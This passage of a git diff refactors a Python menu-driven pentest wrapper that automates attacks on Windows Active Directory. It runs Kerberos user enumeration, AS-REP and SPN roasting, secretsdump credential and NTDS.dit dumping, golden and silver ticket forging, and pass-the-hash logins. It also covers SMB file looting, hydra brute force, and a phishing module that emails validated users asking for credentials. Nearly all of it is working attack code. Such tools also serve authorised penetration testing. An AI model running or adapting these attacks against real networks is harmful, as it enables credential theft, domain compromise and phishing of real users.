+      exTensions = fileExt.replace(",","|")
+      exTentions = "'(" + exTensions + ")'"
+            
       if IP46 == "-6":
-         print(colored("[!] WARNING!!! - Not compatable with IP 6...", colour4)) 
+         print(colored("[!] WARNING!!! - Not compatable with IP 6...", colour1)) 
          checkParams = 1 
       
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             print("[+] Downloading any found files...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + fileExt + " -s " + TSH.rstrip(" ") + " --depth 15 -R")
+            command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -s " + TSH.rstrip(" ") + " --depth 15 -R")
 
          else:
             print("[+] Downloading any found files...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + fileExt + " -s " + TSH.rstrip(" ") + " --depth 15 -R") 
+            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -s " + TSH.rstrip(" ") + " --depth 15 -R") 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '39':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
       
       if TSH[:5] == "EMPTY":
          print("[-] SHARE NAME has not been specified...")
@@ -1804,13 +1747,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '40':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -1823,106 +1766,65 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '41':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if checkParams != 1:
-         print("[*] Enumerating, please wait...")
-         command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")         
-# -----
-# GARBAGE MANAGEMENT
-# ----- 
-         command("sed -i '/@/!d' users.tmp")
-         command("sort users.tmp > sortedusers.tmp")
+         print("[*] Enumerating remote server, please wait...")
+         command("nmap " + IP46 + " -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=DATAFILES/usernames.txt\' " + TIP.rstrip(" ") + " >> users.tmp")         
 
-         with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "a") as parse:
+         command("sed -i '/@/!d' users.tmp")
+         command("sort -r users.tmp > sortedusers.tmp")
+         
+         with open("sortedusers.tmp", "r") as read, open("validusers.tmp", "w") as parse:
             for username in read:
                username = username.replace("|     ","")
                username = username.replace("|_    ","")
                username, null = username.split("@")
                if username != "":
-                  parse.write(username + "\n")
-# -----
-# DATA MANAGEMENT
-# -----  
-         count = len(open('validusers.tmp').readlines())      
-                          
-         with open("usernames.txt", "r") as read1, open("hashes.txt", "r") as read2, open("validusers.tmp", "r") as read3, open("topusers.tmp", "w") as write1, open("tophashes.tmp", "w") as write2:
-            for loop in range(0, count):
-               checkname = read1.readline().rstrip("\n")
-               checkhash = read2.readline().rstrip("\n")
-               validname = read3.readline().rstrip("\n")               
-               for x in range(0, maximum):                                  
-                  if validname == USER[x].rstrip(" "):
-                     write1.write(validname + "\n")
-                     write2.write(checkhash + "\n")                         
-                     command("sed -i '/" + validname + "/d' usernames.txt")
-                     command("sed -i '/" + checkhash + "/d' hashes.txt") 
-# -----
-# FILE MANAGMENT
-# -----
-         command("cat usernames.txt >> topusers.tmp")
-         command("rm usernames.txt")
-         command("mv topusers.tmp usernames.txt")                  
-         command("cat hashes.txt >> tophash.tmp")
-         command("rm hashes.txt")
-         command("mv tophash.tmp hashes.txt")         
-         command("rm tokens.txt")
-         command("touch tokens.txt")         
-# -----
-# MEMORY MANAGMENT
-# -----
-         cleanUsers()
-         cleanTokens()
-            
-         with open("usernames.txt", "r") as read1, open("hashes.txt", "r") as read2:
-            for x in range (0, maximum):
-               USER[x] = read1.readline().rstrip("\n")
-               USER[x] = spacePadding(USER[x], COL3)  
-               
-               HASH[x] = read2.readline().rstrip("\n")
-               if USER[x][:1] == " ":
-                  HASH[x] = spacePadding(HASH[x], COL4)
-               else:
-                  HASH[x] = dotPadding(HASH[x], COL4)        
-# ----
-# TOKEN MANAGEMENT   
-# ----         
-         with open("validusers.tmp", "r") as read1, open("tokens.txt", "a") as write1:
-            for loop in range(0, count): 
-               validuser = read1.readline().rstrip("\n")
-                              
-               for x in range(0, maximum):
-                  if validuser == USER[x].rstrip(" "):
-                     VALD[x] = "1"
-                     write1.write("1" + "\n")
-# -----
-# DISPLAY MANAGEMENT
-# -----
-         if os.path.exists("validusers.tmp"):
-            print("[+] Only the following users are valid...\n")
-            command("tput setaf 2")
-            command("cat validusers.tmp")
-            command("tput sgr0")                      
-      else:
-         print("[-] No users where found, check to see if the domain name is correct...")     
-      prompt()
+                  parse.write(username + "\n")                  
+                  
+         count = len(open('validusers.tmp').readlines())           
+         if count > 0:
+            print("[+] Found valid usernames...\n")
+                             
+            with open("validusers.tmp", "r") as read:
+               for loop in range(0, count):
+                  checkname = read.readline().rstrip("\n")
+                  checkname = spacePadding(checkname, COL3)               
+                  for x in range(0, maximum):
+                     if checkname == USER[x]:
+                        print(colored((USER[x]), colour7))
+                        VALD[x] = "1"
+                        USER.insert(0, USER.pop(x))
+                        HASH.insert(0, HASH.pop(x))
+                        VALD.insert(0, VALD.pop(x))
+                        break
 
+            with open("DATAFILES/usernames.txt", "w") as write1, open("DATAFILES/hashes.txt", "w") as write2, open("DATAFILES/tokens.txt", "w") as write3:
+               for x in range(0, maximum):
+                  write1.write(USER[x].rstrip(" ") + "\n")
+                  write2.write(HASH[x].rstrip(" ") + "\n")
+                  write3.write(VALD[x].rstrip(" ") + "\n")
+      else:
+         print("[-] No usernames where accepted by the remote server...")
+      prompt()
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
 # Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       found = 0
       
       if checkParams != 1:
@@ -1961,13 +1863,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '43':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if checkParams != 1:
          if linecache.getline('usernames.txt', 1) != " ":
@@ -1987,15 +1889,15 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='44':
-      checkParams = testTwo(checkParams)      
+      checkParams = testTwo()      
 
-      with open("usernames.txt", "r") as read:				# CREATE TEMPORARY AUTHORISED LIST
+      with open("DATAFILES/usernames.txt", "r") as read:
          for x in range(0, maximum):
             line = read.readline().rstrip("\n")
             if VALD[x] == "1":
@@ -2022,7 +1924,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2037,7 +1939,7 @@ while True:
          
          for x in range(0, maximum):
             if USER[x].rstrip(" ") == USR.rstrip(" "):
-               HASH[x] = NTM.rstrip(" ") 			# RESET USERS HASH
+               HASH[x] = NTM.rstrip(" ")
          NTM = spacePadding(NTM, COL1)
       else:
          print("[-] Password not found...")
@@ -2046,14 +1948,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
 # Details :                        getTGT.py DOMAIN/USER -hashes :HASH
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '46':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if USR[:2] == "''":
          print("[*] Please enter a valid Username for enumeration...")
@@ -2095,7 +1997,7 @@ while True:
                   marker2 = marker * 2
                   marker3 = marker * 3                  
 
-               with open("hashes.txt", "r") as read:
+               with open("DATAFILES/hashes.txt", "r") as read:
                   for line in read:
                      line = line.rstrip("\n")
                      counter = counter + 1
@@ -2136,7 +2038,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Pass the Ticket.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2148,14 +2050,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/COVID-3
 # Details : Silver Ticket!! 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '48':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + "...\n")
@@ -2176,14 +2078,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Details : Golden Ticket!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '49':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + "...\n")
@@ -2204,13 +2106,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='50':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -2223,13 +2125,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='51':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
@@ -2245,13 +2147,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if checkParams != 1:
          print ("[*] Enumerating, please wait...")     
@@ -2264,13 +2166,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - aclpwn - du neo4j password -f USER - d DOMAIN -sp PASSWORD -s IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          BH1 = input("[+] Enter Neo4j username: ")
@@ -2284,13 +2186,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.   if PAS[:2] != "''":
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - secretdump.py DOMAIN/USER:PASSWORD@IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='54':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          print("Enumerating, please wait...\n")
@@ -2299,15 +2201,15 @@ while True:
          else:
             command(keypath + "secretsdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes ':" + NTM.rstrip(" ") + "' > secrets.tmp")
 
-         command("sed -i '/:::/!d' secrets.tmp")			# TIDY UP FILE READY FOR READING
+         command("sed -i '/:::/!d' secrets.tmp")
          command("sort -u secrets.tmp > ssecrets.tmp")
          	
          count = len(open('ssecrets.tmp').readlines())         
          if count > 0:
-            cleanUsers()						# DELETE CURRENT VALUES 
-            cleanTokens()   
-            command("rm usernames.txt")
-            command("rm hashes.txt")
+            
+               
+            command("rm DATAFILES/usernames.txt")
+            command("rm DATAFILES/hashes.txt")
             command("rm tokens.txt")
             command("touch tokens.txt")
              
@@ -2319,7 +2221,7 @@ while True:
                   get1,get2,get3,get4 = data.split(":") 
                except ValueError:
                   try:
-                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour4))
+                     print(colored("[!] WARNING!!! - Huston, we encountered a problem while unpacking a hash value, but fixed it in situ... just letting you know!!...", colour1))
                      get1, get2, get3 = data.split(":")
                      get4 = get3
                   except:
@@ -2333,16 +2235,16 @@ while True:
                get3 = get1.rstrip("\n")
                get4 = get4.rstrip("\n")
 
-               print(colored("[+] Found User " + get1,colour2))
+               print(colored("[+] Found User " + get1,colour7))
             
                USER[x] = get1[:COL3]
-#               USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")	# STRIP ANY REMAINING DOMAIN NAME
+#              USER[x] = USER[x].lower().replace(DOM.lower().rstrip(" ") + "\\","")	# STRIP ANY REMAINING DOMAIN NAME
                HASH[x] = get4[:COL4]
-               USER[x] = spacePadding(USER[x], COL3) 					# TIDY UP DATA
+               USER[x] = spacePadding(USER[x], COL3)
                HASH[x] = spacePadding(HASH[x], COL4)
                            
-               command("echo " + USER[x].rstrip(" ") + " >> usernames.txt")		# SAVE DATA	
-               command("echo " + HASH[x].rstrip(" ") + " >> hashes.txt")           
+               command("echo " + USER[x].rstrip(" ") + " >> DATAFILES/usernames.txt")
+               command("echo " + HASH[x].rstrip(" ") + " >> DATAFILES/hashes.txt")           
          else:      
             print("[-] No users were found. check the domain name is correct...")               
       prompt()
@@ -2350,13 +2252,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - crackmapexec smb IP -u Administrator -p password --lusers --local-auth --shares & H hash -x 'net user Administrator /domain'
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='55':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          if PAS[:2] != "''":
@@ -2396,13 +2298,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH - -service-name LUALL.exe"
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='56':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip("\n") + "...\n")
@@ -2412,13 +2314,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - domain/username:password@<targetName or address
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='57':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTM HASH " + NTM.rstrip(" ") + "...\n")
@@ -2428,13 +2330,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Remote Windows login using IMPERSONATE & NTM HASH.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='58':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
       
       if checkParams != 1:
          print("[*] Trying user " + USR.rstrip(" ") + " with NTLM HASH " + NTM.rstrip("\n") + "...\n")
@@ -2444,7 +2346,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - NTDS CRACKER (EXPERIMENTAL)
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2475,25 +2377,34 @@ while True:
       if checkParams != 1:
          print("[*] Extracting secrets, please wait...")
          command(keypath + "secretsdump.py -ntds ./" + DIR.rstrip(" ") + "/ntds.dit -system ./" + DIR.rstrip(" ") +  "/SYSTEM -security ./" + DIR.rstrip(" ") + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + DIR.rstrip(" ") +  "/ntlm-extract > log.tmp")
-         
-         print("[*] Importing the data...")
-         command("cut -f1 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > usernames.txt")
-         command("cut -f4 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > hashes.txt")
-         
-         for x in range (0, maximum):
-            USER[x] = linecache.getline("usernames.txt", x + 1).rstrip("\n")
-            USER[x] = spacePadding(USER[x], COL3)
-         
-         for x in range (0, maximum):
-            HASH[x] = linecache.getline("hashes.txt", x + 1).rstrip("\n")
-            HASH[x] = spacePadding(HASH[x], COL4)
-             
+      
+         print("[*] Imported extracted data...")
+         command("cut -f1 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > DATAFILES/usernames.txt")
+         command("cut -f4 -d':' ./" + DIR.rstrip(" ") + "/ntlm-extract.ntds > DATAFILES/hashes.txt")         
+      
+         with open("DATAFILES/usernames.txt", "r") as read1, open("DATAFILES/hashes.txt", "r") as read2:
+           for x in range (0, maximum):
+               gotUser = read1.readline().rstrip("\n")
+               if gotUser != "":
+                  USER[x] = gotUser
+                  USER[x] = spacePadding(USER[x], COL3)            
+                  
+               gotHash = read2.readline().rstrip("\n")
+               if gotHash != "":
+                  HASH[x] = gotHash
+                  if USER[x][:1] != " ":
+                     HASH[x] = spacePadding(HASH[x], COL4)
+                  else:
+                     HASH[x] = dotPadding(HASH[x], COL4)
+               VALD[x] = "0"
+         command("rm DATAFILES/tokens.txt")
+         command("touch DATAFILES/tokens.txt") 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - SSH GEN GENERATION
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2514,13 +2425,13 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='61':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
    
       if checkParams != 1:
          if WEB[:1] != "":
@@ -2538,20 +2449,20 @@ while True:
             print("[+] Adding NCrack minimal.usr list as well...")
 
          for x in range (0,maximum):
-            USER[x] = linecache.getline("usernames.txt", x+1).rstrip(" ")
+            USER[x] = linecache.getline("DATAFILES/usernames.txt", x+1).rstrip(" ")
             USER[x] = spacePadding(USER[x], COL3)
       prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - https://tools.kali.org/password-attacks/cewl
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='62':
-      checkParams = testOne(checkParams)  
+      checkParams = testOne()  
    
       if checkParams != 1:
          if WEB[:1] != "":
@@ -2572,24 +2483,23 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Nano usernames.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='63':
-      command("nano usernames.txt")
+      command("nano DATAFILES/usernames.txt")
       
       for x in range (0, maximum):
-         USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-         USER[x] = spacePadding(USER[x], COL3)
-         
+         USER[x] = linecache.getline("DATAFILES/usernames.txt", x + 1).rstrip(" ")
+         USER[x] = spacePadding(USER[x], COL3)         
       prompt()
             
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Nano passwords.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2598,31 +2508,30 @@ while True:
       command("nano passwords.txt")
       
       for x in range (0, maximum):
-         HASH[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
+         HASH[x] = linecache.getline("DATAFILES/hashes.txt", x + 1).rstrip(" ")
          HASH[x] = spacePadding(HASH[x], COL4)     
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Editor  hashes.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='65':
-      command("nano hashes.txt")
+      command("nano DATAFILES/hashes.txt")
            
       for x in range (0, maximum):
-            HASH[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
-            HASH[x] = spacePadding(HASH[x], COL4)
-            
+            HASH[x] = linecache.getline("DATAFILES/hashes.txt", x + 1).rstrip(" ")
+            HASH[x] = spacePadding(HASH[x], COL4)                        
       prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Editor hosts.conf
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2634,16 +2543,16 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - Mr Phiser is experimental!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='67':
-      checkParams = testTwo(checkParams)
+      checkParams = testTwo()
 
       if "25" not in POR:
-         print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour4))
+         print(colored("[!] WARNING!!! - Port 25 not found in remote live ports listing...", colour1))
          checkParams = 1
          
       if checkParams != 1:
@@ -2675,12 +2584,12 @@ while True:
          command('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')
          
          print("[*] Created phishing email...\n")
-         print(colored("Subject: Credentials/Errors\n", colour5))
+         print(colored("Subject: Credentials/Errors\n", colour3))
          
          with open("body.tmp", "r") as list:
             for phish in list:
                phish = phish.rstrip("\n")
-               print(colored(phish,colour5))
+               print(colored(phish,colour3))
             print("")
             
          print("[*] Checking for valid usernames...")
@@ -2707,7 +2616,7 @@ while True:
              with open("phish.tmp", "r") as list:
                 for line in list:
                    line = line.rstrip("\n")
-                   print(colored(line + "@" + DOM.rstrip(" "),colour2))
+                   print(colored(line + "@" + DOM.rstrip(" "),colour7))
                            
          if match == 1:
             print("\n[*] Phishing the list...")			# GO PHISHING
@@ -2726,19 +2635,15 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - GOBUSTER WEB ADDRESS/IP common.txt
 # Details : Alternative dictionary - /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='68':
-      checkParams = testOne(checkParams)
-      
-      fileExt = fileExt.replace('(','')
-      fileExt = fileExt.replace(')','')
-      fileExt = fileExt.replace('|',',')
-      
+      checkParams = testOne()
+           
       if checkParams != 1:
          if WEB[:5] == "EMPTY":
             command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x " + fileExt + " -f -w /usr/share/dirb/wordlists/common.txt -t 50")
@@ -2752,18 +2657,18 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Menu option selected - Nikto
+# Version : @g3nT_0r@nG3                                                              
+# Details : Menu option selected - Nikto scan
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='69':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
 
       if checkParams != 1:
          if ":" in TIP:
-            print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour4))
-#            checkParams = 1         
+            print(colored("[!] WARNING!!! - IP6 is currently not supported...", colour1))
+            checkParams = 1         
          
          if checkParams != 1:
             if WEB[:5] != "EMPTY":
@@ -2775,25 +2680,25 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Menu option selected - HYDRA BRUTE FORCE FTP
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='70':
-      checkParams = testOne(checkParams)
+      checkParams = testOne()
          
       if checkParams != 1:
